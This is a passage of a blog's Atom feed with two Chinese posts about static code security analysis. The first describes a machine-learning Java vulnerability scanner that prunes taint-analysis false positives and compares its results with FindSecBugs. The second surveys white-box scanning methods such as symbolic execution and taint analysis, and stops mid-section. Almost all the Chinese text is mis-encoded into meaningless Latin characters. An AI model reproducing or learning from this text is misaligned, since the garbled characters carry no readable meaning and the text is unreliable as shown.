æ³•åˆ©ç”¨ï¼›è‹¥æ¼æ´ä¸­æ‰€æœ‰ä¼ æ’­æ ‘æ— æ³•åˆ©ç”¨ï¼Œé‚£ä¹ˆæ ‡è®°è¯¥æ¼æ´ä¸ºè¯¯æŠ¥ã€‚ä¾‹å¦‚ä»£ç  1 ä¸­ï¼Œé¦–å…ˆBLSTMæ¨¡å‹å¾ˆå¯èƒ½é¢„æµ‹åˆ°<strong>filter()â†’line:13</strong> åˆ‡ç‰‡æ— æ³•ä¼ æ’­æ±¡ç‚¹ï¼Œå› æ­¤å¯¹åº”çš„æ±¡ç‚¹ä¼ æ’­æ ‘ä¸å¯åˆ©ç”¨ï¼Œåˆå› ä¸ºæ¼æ´åªæœ‰ä¸€ä¸ªä¼ æ’­æ ‘ï¼Œå› æ­¤ç³»ç»Ÿåˆ¤æ–­æ¼æ´ä¸ºè¯¯æŠ¥ã€‚</p><p>ä¸‹å›¾å±•ç¤ºäº†ç³»ç»Ÿä¸­ä»£ç  1çš„é¢„æµ‹ç»“æœï¼Œè¯¥å®ä¾‹çš„èŠ‚ç‚¹å·²ç»å˜ç°ï¼Œä¸”é¢„æµ‹æ˜¾ç¤ºä¸ºâ€œ[P:FP]â€ï¼ˆè¯¯æŠ¥ï¼‰ï¼Œå·¦ä¸‹æ–¹è¢«é¢„æµ‹ä¸ºæ¸…æ´å‡½æ•°å·²ç”±æ¸…æ´æ ‡è®°æ ‡æ³¨ï¼Œè¿™äº›æ ‡è®°å‘ç”¨æˆ·è§£é‡Šç³»ç»Ÿä¸ºä½•å°†å…¶é¢„æµ‹ä¸ºè¯¯æŠ¥ï¼Œè¿™è¯´æ˜æœ¬ç³»ç»Ÿæ˜¯çœŸå®æœ‰æ•ˆçš„ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/å›¾3.png" alt="å›¾3"></p><p>å¯¹äºæ±¡ç‚¹ä¼ æ’­æŠ¥å‘Šï¼Œç”¨æˆ·å¯ä»¥æ ‡è®°ä¸ºæ­£æŠ¥æˆ–è¯¯æŠ¥ã€‚å¯¹äºæ­£æŠ¥ï¼Œç”¨æˆ·éœ€è‡³å°‘æŒ‡å®šä¸€ä¸ªå¯åˆ©ç”¨çš„æ±¡ç‚¹ä¼ æ’­æ ‘ï¼›å¯¹äºè¯¯æŠ¥ï¼Œç”¨æˆ·éœ€æŒ‡å®šè‹¥å¹²æ¡æ±¡ç‚¹æ— æ³•ä¼ æ’­çš„ç‰‡æ®µï¼Œç›´åˆ°ç³»ç»Ÿæ ¹æ®æ±¡ç‚¹ä¼ æ’­è§„åˆ™å°†å…¶æ¨å¯¼ä¸ºè¯¯æŠ¥ã€‚</p><h1 id="é¡¹ç›®æ•ˆç›Š"><a href="#é¡¹ç›®æ•ˆç›Š" class="headerlink" title="é¡¹ç›®æ•ˆç›Š"></a>é¡¹ç›®æ•ˆç›Š</h1><p>ä¸ºè¯æ˜ç³»ç»Ÿå‡†ç¡®æ€§ï¼Œæœ¬æ–‡å°†æœ¬ç³»ç»Ÿä¸ç›®å‰æµè¡Œçš„æ‰«æå·¥å…· FindSecBugs å¯¹æ¯”ï¼Œä»¥OWASP Benchmark v1.1ä¸­æ±¡ç‚¹ä¼ æ’­ç±»æ¼æ´ä½œä¸ºæ•°æ®é›†ï¼Œæ¯”è¾ƒä¸¤è€…çš„å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰ã€ç²¾ç¡®ç‡ï¼ˆPrecisionï¼‰ã€å¬å›ç‡ï¼ˆRecallï¼‰å’Œ F1ã€‚</p><p><img src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/image-20200528173454324.png" alt="image-20200528173454324"></p><p>ç»“æœå¦‚å›¾ 4 æ‰€ç¤ºã€‚å¯ä»¥çœ‹å‡ºï¼Œä¸ºäº†ä¸å‘ç”Ÿæ¼æŠ¥ï¼ŒFind Security Bugs äº§ç”Ÿéå¸¸é«˜çš„è¯¯æŠ¥ç‡ï¼ˆè¯¯æŠ¥ç‡ä¸º1-65.09%=34.91%ï¼‰ä»è€Œå¯¼è‡´å‡†ç¡®ç‡å’Œ F1 å€¼æ°´å¹³ä¹Ÿè¾ƒä½ï¼Œä¸å‡†ç¡®çš„æ¼æ´æŠ¥å‘Šä¸ä»…ä¼šç»™å®‰å…¨å·¥ç¨‹å¸ˆé€ æˆå·¨å¤§å‹åŠ›ï¼Œæ›´å¯èƒ½é€ æˆé¡¹ç›®å¼€å‘è¿›åº¦è¢«é˜»å¡ï¼Œè€Œæœ¬ç³»ç»Ÿç»“åˆæ±¡ç‚¹åˆ†æå’Œæœºå™¨å­¦ä¹ çš„ä¼˜åŠ¿ï¼Œä»…ç‰ºç‰² 11.35% çš„å¬å›ç‡ï¼Œå°†ç²¾ç¡®ç‡æé«˜åˆ° 90% ä»¥ä¸Šï¼Œå³å¹³å‡ç³»ç»Ÿä¸­æŠ¥å‘Šçš„ 10 ä¸ªæ¼æ´ä¸­ï¼Œåªæœ‰ä¸€ä¾‹å¯èƒ½ä¸ºè¯¯æŠ¥ã€‚åœ¨å‡†ç¡®ç‡å’Œ F1 æŒ‡æ ‡ä¸Šä¹Ÿè¿œé«˜äº Find Security Bugsï¼Œè¿™è¯´æ˜ç‰ºç‰²å¬å›ç‡å…·æœ‰è¾ƒé«˜çš„æ”¶ç›Šæ¯”ã€‚</p><p>ç»¼ä¸Šï¼Œç›¸è¾ƒäºä¼ ç»Ÿæ±¡ç‚¹åˆ†æç±»æ‰«æå™¨ï¼Œæœ¬ç³»ç»Ÿèƒ½æ›´å‡†ç¡®åœ°å‘ç°æ¼æ´ï¼Œå¹¶ä¸”ä»¥è¾ƒå°çš„ä»£ä»·æå‡å‡†ç¡®æ€§ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ–‡ä»‹ç»äº†ä¸€æ¬¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaé™æ€æ¼æ´æ‰«æç³»ç»Ÿï¼ŒåŸºäºå­¦æœ¯ç•Œå‰æ²¿å·¥ä½œï¼Œç›¸å¯¹äºä¼ ç»Ÿæ‰«æå·¥å…·æœ¬ç³»ç»Ÿèƒ½æä¾›æ›´å‡†ç¡®çš„æ‰«æç»“æœï¼ŒåŒæ—¶ç³»ç»Ÿè§£å†³äº†å­¦æœ¯å·¥å…·åªèƒ½åº”å¯¹å°è§„æ¨¡ç¨‹åºçš„é—®é¢˜ï¼Œä½¿å…¶å¯ç”¨äºå®é™…ç”Ÿäº§ç¯å¢ƒã€‚åœ¨æœªæ¥å·¥ä½œä¸­ï¼Œæˆ‘ä»¬å°†ä¼šè¦†ç›–æ›´å¤šæ¼æ´ç±»å‹ã€æ‰©å……å­¦ä¹ æ•°æ®å¹¶å¯¹ç‰¹å®šæ¼æ´ç‹¬ç«‹è®­ç»ƒæ¨¡å‹ï¼Œä½¿æ‰«ææŠ¥å‘Šæ›´åŠ å‡†ç¡®ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ol><li><p>Li Z, Zou D, Xu S, et al. Vuldeepecker: A deep learning-based system for vulnerability detection[J]. // Proceedings of the 2018 Network and Distributed System Security Symposium </p></li><li><p>Koc U, Saadatpanah P, Foster J S, et al. Learning a classifier for false positive error reports emitted by static code analysis tools[C]//Proceedings of the 1st ACM SIGPLAN International Workshop on Machine Learning and Programming Languages. 2017: 35-42.</p></li><li><p>Koc U, Wei S, Foster J S, et al. An Empirical Assessment of Machine Learning Approaches for Triaging Reports of a Java Static Analysis Tool[C]//Proceedings of the 12th IEEE Conference on Software Testing, Validation and Verification (ICST). IEEE, 2019: 288-299.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;æœ¬æ–‡é¦–æ¬¡å‘è¡¨åœ¨&lt;a href=&quot;https://www.toutiao.com/i6826913540683596300/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;æ…•æµ‹å¤´æ¡å…¬ä¼—å·&lt;/a&gt;ï¼Œè¿™é‡Œåªä½œå½’æ¡£ç”¨&lt;/strong&gt;&lt;/p&gt;&lt;h1 id=&quot;èƒŒæ™¯æ„ä¹‰&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯æ„ä¹‰&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯æ„ä¹‰&quot;&gt;&lt;/a&gt;èƒŒæ™¯æ„ä¹‰&lt;/h1&gt;&lt;p&gt;éšç€äººä»¬å¯¹è½¯ä»¶å®‰å…¨çš„ä¸æ–­é‡è§†ï¼Œé™æ€å®‰å…¨æ‰«æç³»ç»Ÿè¢«éƒ¨ç½²äºå¼€å‘æµç¨‹ã€‚ç›¸å¯¹äºå…¶ä»–ä¼ ç»Ÿåˆ†ææ–¹æ³•ï¼Œæ±¡ç‚¹åˆ†ææŠ€æœ¯ç”±äºå…·æœ‰è¾ƒé«˜çš„å¯è§£é‡Šæ€§å’Œå‡†ç¡®æ€§ï¼Œç›®å‰ä½œä¸ºæŒ–æ˜ Web æ¼æ´çš„å¸¸ç”¨æŠ€æœ¯ï¼Œå¹¿æ³›åº”ç”¨äºå¼€æºå’Œå•†ç”¨æ‰«æå™¨ä¸­ã€‚&lt;/p&gt;&lt;p&gt;ç„¶è€Œï¼Œæ±¡ç‚¹åˆ†ææ–¹æ³•å­˜åœ¨ç§ç§ä¸è¶³ã€‚é¦–å…ˆï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†å®¹å™¨ç±»å‹ï¼Œé™æ€æ±¡ç‚¹åˆ†æåªèƒ½å°†å®¹å™¨å˜é‡ï¼ˆå¦‚Mapã€Listå˜é‡ï¼‰çš„ä¼ æ’­è§„åˆ™è®¾ä¸ºä¼ æ’­/ä¸ä¼ æ’­æ±¡ç‚¹ï¼Œé€ æˆè¿‡æ±¡æŸ“/æ¬ æ±¡æŸ“ï¼›å…¶æ¬¡ï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†æ§åˆ¶æµï¼Œæ±¡ç‚¹åˆ†æå¹¶ä¸èƒ½è¯†åˆ«ç”¨äºæ£€æŸ¥æ•°æ®æ˜¯å¦åˆæ³•çš„åˆ†æ”¯è¯­å¥ï¼Œå¯¼è‡´è¯¯æŠ¥ï¼›æœ€åï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†ç‰¹æ®Šçš„ä¼ æ’­æ¡ä»¶ï¼Œå¦‚SSRFæ¼æ´è¦æ±‚æ”»å‡»è€…èƒ½æ“çºµåŸŸåï¼Œè‹¥æ±¡ç‚¹æ‹¼æ¥åœ¨URLå‚æ•°éƒ¨åˆ†ï¼Œåˆ™ä»£ç ä¸å­˜åœ¨æ¼æ´ï¼Œè€Œæ±¡ç‚¹åˆ†æä»ä¼šæŠ¥å‘Šæ¼æ´ã€‚ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œç›®å‰å®‰å…¨å·¥ç¨‹å¸ˆåªæœ‰æ‰‹åŠ¨è®¾è®¡ç²¾å·§çš„è§„åˆ™ï¼Œå¯å³ä½¿è¿™æ ·ä»ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ç”šè‡³æ¼æŠ¥ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="æºç å®‰å…¨" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°</title>
    <link href="http://anemone.top/whitebox-%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/"/>
    <id>http://anemone.top/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/</id>
    <published>2020-05-28T11:27:37.000Z</published>
    <updated>2020-05-31T10:02:42.114Z</updated>
    
    <content type="html"><![CDATA[<p>å†™æ¯•è®¾è°ƒæŸ¥èƒŒæ™¯çŸ¥è¯†æ—¶åšçš„ï¼Œåœ¨<a href="https://www.t00ls.net/thread-56572-1-1.html" target="_blank" rel="noopener">t00ls</a>å’Œ<a href="https://forum.90sec.com/t/topic/1087" target="_blank" rel="noopener">90sec</a>å‘è¿‡å¸–å­ï¼Œè¿™é‡Œåšå½’æ¡£ç”¨ã€‚</p><h1 id="è¯æ³•åˆ†ææŠ€æœ¯"><a href="#è¯æ³•åˆ†ææŠ€æœ¯" class="headerlink" title="è¯æ³•åˆ†ææŠ€æœ¯"></a>è¯æ³•åˆ†ææŠ€æœ¯</h1><p>è¯æ³•åˆ†ææŠ€æœ¯æ˜¯æœ€ç®€å•çš„ä¸€ç±»æ¼æ´æŒ–æ˜æŠ€æœ¯ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯å°†ä»£ç æ–‡æœ¬ä¸å½’çº³å¥½çš„ç¼ºé™·æ¨¡å¼è¿›è¡ŒåŒ¹é…ï¼Œä»¥æ­¤å‘ç°æ¼æ´ã€‚ç”±äºå…¶ä¸æ·±å…¥åˆ†æç¨‹åºç»“æ„å’Œè¯­ä¹‰ï¼Œå¾€å¾€åªèƒ½æŒ–æ˜è¾ƒä¸ºç®€å•çš„ä¸€ç±»æ¼æ´ï¼Œå¹¶ä¸”å­˜åœ¨ç›¸å½“é«˜çš„è¯¯æŠ¥ç‡ï¼Œåœ¨å®é™…åœºæ™¯ä¸‹åº”ç”¨è¾ƒå°‘ï¼Œä½†ç”±äºå…¶æ€æƒ³ç®€å•ï¼Œé€‚ç”¨æ€§å¾ˆå¹¿ï¼Œç›®å‰ä¹Ÿè¿˜å­˜åœ¨ç±»ä¼¼å·¥å…·ï¼Œå¦‚ï¼š<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank" rel="noopener">MobSF</a>ï¼Œ<a href="https://github.com/WhaleShark-Team/cobra" target="_blank" rel="noopener">Cobra</a>ã€‚</p><a id="more"></a><h1 id="å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯"><a href="#å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯" class="headerlink" title="å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯"></a>å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯</h1><p>å½¢å¼åŒ–æ–¹æ³•åˆ†æä¸»è¦æ€æƒ³æ˜¯å°†è½¯ä»¶ä»£ç æ€§è´¨è¿›è¡Œå½¢å¼åŒ–æè¿°ï¼Œå†åˆ¤æ–­è¯¥æè¿°æ˜¯å¦æ»¡è¶³æ¼æ´ç‰¹å¾çš„ä¸€ç±»åˆ†ææ–¹æ³•[1]ï¼Œå…¶ä¸­å®šç†è¯æ˜æŠ€æœ¯æ˜¯å½¢å¼åŒ–ä»£ç åˆ†ææŠ€æœ¯çš„ä¸»è¦ä»£è¡¨ã€‚</p><p>å®šç†è¯æ˜æŠ€æœ¯å°†æ¼æ´å­˜åœ¨ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰å®šä¹‰ä¸ºä¸€å®šç†ï¼Œå†å°†æºç¨‹åºä»£ç ç‰¹å¾è½¬åŒ–ä¸ºæ•°å­¦è¡¨è¾¾å½¢å¼ï¼Œæœ€åå¯¹æ•°å­¦è¡¨è¾¾è¿›è¡Œé€»è¾‘æ¨ç†ï¼Œè‹¥å®šç†å­˜åœ¨æ€§å¾—ä»¥è¯æ˜ï¼Œåˆ™æ¼æ´å­˜åœ¨ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰ï¼Œå³æ¼æ´æŒ–æ˜è¿‡ç¨‹ç±»ä¼¼äºæ•°å­¦ä¸Šçš„å®šç†è¯æ˜è¿‡ç¨‹ã€‚ä¸»è¦ä»£è¡¨æ€§å·¥å…·æœ‰ <a href="https://fbinfer.com/" target="_blank" rel="noopener">infer</a>ã€ ESC/Java[2] å’Œ saturn[3]ã€‚</p><p>è¯¥æŠ€æœ¯ä½œä¸ºä¸€ç§ä½¿ç”¨ä¸¥æ ¼æ•°ç†é€»è¾‘æ¨ç†ä½œä¸ºæ£€æµ‹æ‰‹æ®µçš„æŠ€æœ¯ï¼Œè¯¯æŠ¥ç‡è¾ƒä½ï¼Œä½†ç”±äºå…¶éœ€è¦é’ˆå¯¹ç‰¹å®šæ¼æ´æ„å»ºæ•°å­¦æ¡ä»¶ï¼Œéœ€è¦å¤§é‡äººå·¥å‚ä¸ï¼Œæœ‰çš„æ¼æ´ç”šè‡³éš¾ä»¥ç”¨æ•°å­¦ç»“æ„è¡¨è¾¾ï¼Œç›®å‰åªé€‚ç”¨äºæ­»å¾ªç¯ã€èµ„æºæ³„éœ²å’Œç©ºæŒ‡é’ˆç­‰é—®é¢˜ï¼Œå¯¹æ–°æ¼æ´çš„æ‰©å±•æ€§ä¸é«˜ï¼ŒåŒæ—¶ï¼Œå¦‚ä½•å°†å¤§è§„æ¨¡ç¨‹åºåº”ç”¨äºå½¢å¼åŒ–æ–¹æ³•åˆ†æä¹Ÿæˆä¸ºå·¥ä¸šç•ŒäºŸå¾…è§£å†³çš„é—®é¢˜ã€‚ </p><p>å¯¹äºå½¢å¼åŒ–åˆ†ææŠ€æœ¯æœ¬äººä¹Ÿä¸æ˜¯å¾ˆäº†è§£ï¼Œæƒ³è¦è¿›ä¸€æ­¥äº†è§£çš„å»ºè®®çœ‹ä¸‹è®ºæ–‡[1]å’Œ<a href="https://github.com/leanprover/lean2" target="_blank" rel="noopener">lean2</a>ã€‚</p><h1 id="ç¬¦å·æ‰§è¡ŒæŠ€æœ¯"><a href="#ç¬¦å·æ‰§è¡ŒæŠ€æœ¯" class="headerlink" title="ç¬¦å·æ‰§è¡ŒæŠ€æœ¯"></a>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯</h1><p>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ˜¯ä¸€ç§å°†ç¨‹åºæ‰§è¡Œå¯è¾¾æ€§é—®é¢˜è½¬åŒ–ä¸ºçº¦æŸæ±‚è§£é—®é¢˜ï¼Œå¹¶ä»¥æ­¤è¿›è¡Œæ¼æ´æŒ–æ˜çš„æŠ€æœ¯[4]ï¼Œä»£è¡¨æ€§å·¥å…·æœ‰<a href="http://angr.io/" target="_blank" rel="noopener">angr</a>ï¼ŒDART[5], CUTE[6], EXE[7]å’ŒKLEE[8]ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œç¬¦å·æ‰§è¡ŒåŒ…å«ä¸€ä¸ªç¬¦å·çŠ¶æ€è¡¨$\sigma$å’Œä¸€ä¸ªç¬¦å·è·¯å¾„çº¦æŸ $PC$ ï¼Œå¼€å§‹æ—¶ï¼Œ $\sigma=\varnothing, PC=true$ ï¼Œæ¯è¯»å–ä¸€æ¡è¯­å¥ï¼Œå°±å°†å˜é‡æŠ½è±¡ä¸ºçº¦æŸæ±‚è§£ä¸­çš„å˜é‡ã€å¸¸é‡æˆ–ä»–ä»¬çš„è¡¨è¾¾å¼æ”¾å…¥ $\sigma$ ä¸­ï¼Œç‰¹åˆ«çš„ï¼Œå½“é‡åˆ°æ¡ä»¶åˆ¤æ–­ $if(e)$ æ—¶ï¼Œå°†ifåˆ†æ”¯çš„ $PC$ æ›´æ–°ä¸º $PC \wedge \sigma(e)$ ï¼Œå°†elseåˆ†æ”¯çš„ $PCâ€™$ æ›´æ–°ä¸º $PC\wedge \neg\sigma(e)$ ï¼Œéšåä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ±‚è§£ $PC$ å’Œ $PCâ€™$ ï¼Œå¦‚æœçº¦æŸä¸æ»¡è¶³ï¼Œåˆ™åœæ­¢å¯¹è¯¥åˆ†æ”¯çš„è§£æï¼ˆå› ä¸ºè¯¥åˆ†æ”¯ä¸å¯è¾¾ï¼‰ã€‚å½“ç¬¦å·æ‰§è¡Œé‡åˆ°ç¨‹åºå´©æºƒã€é¢„å…ˆå®šä¹‰çš„æ¼æ´è¯­å¥ã€æˆ–æ˜¯ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶ï¼Œæ•´ä¸ªåˆ†æåœæ­¢ï¼ŒåŒæ—¶å¯ä»¥è®¡ç®—å¯ä»¥åˆ°è¾¾åœæ­¢ç‚¹çš„è¾“å…¥ã€‚</p><p>ç¬¦å·æ‰§è¡Œå¯ä»¥åˆ†æç¨‹åºä¸­çš„æ§åˆ¶æµã€è¦†ç›–æ›´å¤šä»£ç ï¼ŒåŒæ—¶ä¹Ÿæœ‰æ•ˆé™ä½äº†è¯¯æŠ¥ç‡ï¼Œä½†ä¼ ç»Ÿç¬¦å·æ‰§è¡Œä¸¥é‡ä¾èµ–äºçº¦æŸæ±‚è§£å™¨çš„èƒ½åŠ›ï¼Œä¾‹å¦‚ï¼Œè‹¥çº¦æŸæ±‚è§£å™¨ä¸èƒ½å¤„ç†éçº¿æ€§è®¡ç®—ï¼Œæˆ–æ˜¯æ•´ä¸ªç¨‹åºä¸­å­˜åœ¨æ— æ³•åˆ†æçš„ç¬¬ä¸‰æ–¹åº“ï¼Œé‚£ä¹ˆæ•´ä¸ªåˆ†æå°†æ— æ³•ç»§ç»­ã€‚ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œç ”ç©¶è€…ä»¬æå‡ºäº†åŠ¨æ€ç¬¦å·æ‰§è¡Œçš„æƒ³æ³•[5,6,7,8]ï¼Œä½†å…¶åœ¨å®é™…åº”ç”¨ä¸­ä»ä¸æ˜¯å¾ˆå¹¿æ³›ï¼Œä¸»è¦åŸå› åœ¨äºå…¶éœ€è¦å¤§é‡è®¡ç®—èµ„æºï¼Œç”šè‡³åœ¨å¤„ç†å¤§è§„æ¨¡ç¨‹åºæ—¶ï¼Œå‡ºç°çš„è·¯å¾„çˆ†ç‚¸é—®é¢˜ä¼šå¯¼è‡´çº¦æŸæ±‚è§£æ— æ³•äº§ç”Ÿç»“æœã€‚</p><p>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ˜¯ç›®å‰å·¥ä¸šç•Œå’Œä¼ä¸šç•Œéƒ½åœ¨ç ”ç©¶çš„çƒ­é—¨é¢†åŸŸï¼Œè¿™é‡Œæ¨èè‹±è¯­å¥½çš„æœ‹å‹çœ‹ä¸‹<a href="https://www.youtube.com/watch?v=mffhPgsl8Ws" target="_blank" rel="noopener">æ­¤è§†é¢‘</a>å’Œç¬¦å·æ‰§è¡Œçš„ç»å…¸æ–‡ç« â€œSymbolic Execution for Software Testing: Three Decades Laterâ€[4]ï¼Œè‹±è¯­ä¸å¥½çš„æœ‹å‹æ¨èä¸€ä¸‹è¿™<a href="https://wcventure.github.io/" target="_blank" rel="noopener">wcventure</a>å¤§ä½¬æ€»ç»“çš„<a href="https://blog.csdn.net/wcventure" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><h1 id="æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯"><a href="#æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯" class="headerlink" title="æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯"></a>æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯</h1><p>æ•°æ®æµåˆ†ææ˜¯ä¸€ç§æŒ‰ç¨‹åºæ‰§è¡Œè·¯å¾„æ¨¡æ‹Ÿæ•°æ®æµåŠ¨çš„ä¸€ç§åˆ†ææŠ€æœ¯ï¼Œå…¶åŸæœ¬ç”¨äºè¿›è¡Œç¨‹åºä¼˜åŒ–[9]ï¼Œå®‰å…¨ç ”ç©¶è€…ä»¬å‘ç°åå°†å…¶è¿ç”¨äºæ¼æ´æŒ–æ˜ä¸­ï¼Œå¦‚ä»Šè¯¥æŠ€æœ¯åœ¨ç™½ç›’ï¼Œç°ç›’å’Œé»‘ç›’æµ‹è¯•éƒ½æœ‰åº”ç”¨[10]ã€‚</p><p>åœ¨æ•°æ®æµåˆ†æè¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨<strong>è¿‡ç¨‹å†…åˆ†æ</strong>å’Œ<strong>è¿‡ç¨‹é—´åˆ†æ</strong>ï¼Œè¿‡ç¨‹å†…åˆ†æä¸»è¦å¯¹å‡½æ•°å†…åˆ†æï¼Œè€Œè¿‡ç¨‹é—´åˆ†æä¸»è¦å¤„ç†è·¨å‡½æ•°åˆ†æã€‚</p><ul><li><p>å¯¹äºè¿‡ç¨‹å†…åˆ†æï¼Œæ ¹æ®å…¶å¯¹ç¨‹åºè·¯å¾„çš„åˆ†æç²¾åº¦ï¼Œå¯åˆ†ä¸ºæµä¸æ•æ„Ÿåˆ†æï¼Œæµæ•æ„Ÿåˆ†æå’Œè·¯å¾„æ•æ„Ÿåˆ†æã€‚æµä¸æ•æ„Ÿçš„æ•°æ®æµåˆ†æåªæ˜¯æŒ‰ä»£ç è¡Œå·ä»ä¸Šè€Œä¸‹è¿›è¡Œåˆ†æï¼›æµæ•æ„Ÿåˆ†æä¼šé¦–å…ˆäº§ç”Ÿç¨‹åºæ§åˆ¶æµå›¾ï¼ˆCFG, Control Flow Graphï¼‰ï¼Œå†æŒ‰ç…§CFGçš„æ‹“æ‰‘æ’åºæ­£å‘æˆ–é€†å‘åˆ†æï¼›è·¯å¾„æ•æ„Ÿä¿¡æ¯ä¸ä»…è€ƒè™‘åˆ°è¯­å¥å…ˆåé¡ºåºï¼Œè¿˜ä¼šè€ƒè™‘è¯­å¥å¯è¾¾æ€§ï¼Œå³ä¼šæ²¿å®é™…å¯æ‰§è¡Œåˆ°è·¯å¾„è¿›è¡Œåˆ†æã€‚</p></li><li><p>è¿‡ç¨‹é—´åˆ†æï¼Œé¦–å…ˆæ„é€ ç¨‹åºçš„è°ƒç”¨å›¾ï¼ˆCG, Call Graphï¼‰ï¼Œæ¥ç€éå†å›¾ä¸­å‡½æ•°è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå½“é‡åˆ°å…¶ä»–å‡½æ•°æ—¶ï¼Œè‹¥å·²åˆ†æè¿‡ï¼Œåˆ™ç›´æ¥ä½¿ç”¨åˆ†æç»“æœå‘ä¸‹åˆ†æï¼Œè‹¥æœªåˆ†æè¿‡ï¼Œåˆ™è·Ÿè¿›è¯¥å‡½æ•°ï¼Œå†æ¬¡è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå¹¶ä¸”å°†åˆ†æç»“æœä¿å­˜ã€‚</p></li></ul><p>æ•°æ®æµåˆ†æèƒ½å¤Ÿä¸€å®šç¨‹åº¦ä¸Šç†è§£ç¨‹åºè¯­ä¹‰ï¼Œæ˜¯ä¸€ç§æ¯”è¯æ³•åˆ†ææŠ€æœ¯æ›´ä¸ºç²¾ç¡®çš„ä¸€ç±»åˆ†ææŠ€æœ¯ï¼Œå…¶å…³é”®åœ¨äºå‡†ç¡®è®¡ç®—ç¨‹åºçš„æ•°æ®æµã€‚</p><h1 id="æ±¡ç‚¹åˆ†ææŠ€æœ¯"><a href="#æ±¡ç‚¹åˆ†ææŠ€æœ¯" class="headerlink" title="æ±¡ç‚¹åˆ†ææŠ€æœ¯"></a>æ±¡ç‚¹åˆ†ææŠ€æœ¯</h1><p>æ±¡ç‚¹åˆ†æå±äºæ•°æ®æµåˆ†æçš„å˜ç§ï¼Œé€šè¿‡åˆ¤æ–­å…³é”®æ“ä½œçš„æ•°æ®ï¼ˆå¦‚è°ƒç”¨å±é™©å‡½æ•°çš„å‚æ•°ï¼‰æ˜¯å¦å¯è¢«ç”¨æˆ·æ“æ§ï¼Œæ¨æµ‹ç¨‹åºæ˜¯å¦å­˜åœ¨å®‰å…¨æ€§æ¼æ´ã€‚ç”±äºå…¶äº†è§£ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æœ‰è¾ƒå¼ºçš„å¯è§£é‡Šæ€§â€”â€”å®‰å…¨å·¥ç¨‹å¸ˆå¯ä»¥é€šè¿‡è·Ÿè¸ªæ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹åˆ¤æ–­æ˜¯å¦å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå› æ­¤å…¶ä¹Ÿæˆä¸ºäº†æŒ–æ˜ Web æˆ– Android æ¼æ´è¾ƒä¸ºå¸¸ç”¨çš„æŠ€æœ¯ï¼Œä¹Ÿè¢«å¾ˆå¤šå¼€æºæˆ–å•†ç”¨ç™½ç›’æ‰«æå™¨ä½¿ç”¨ï¼Œå¦‚ï¼šPixy[11]ã€Find Security Bugsã€<a href="https://www.microfocus.com/en-us/solutions/application-security" target="_blank" rel="noopener">Fortify</a>å’Œ<a href="https://lgtm.com/" target="_blank" rel="noopener">LGTM</a>ã€‚</p><h2 id="ä¸‰è¦ç´ "><a href="#ä¸‰è¦ç´ " class="headerlink" title="ä¸‰è¦ç´ "></a>ä¸‰è¦ç´ </h2><p>æ±¡ç‚¹åˆ†æä¸»è¦æœ‰ä¸‰ä¸ªç»„æˆè¦ç´ 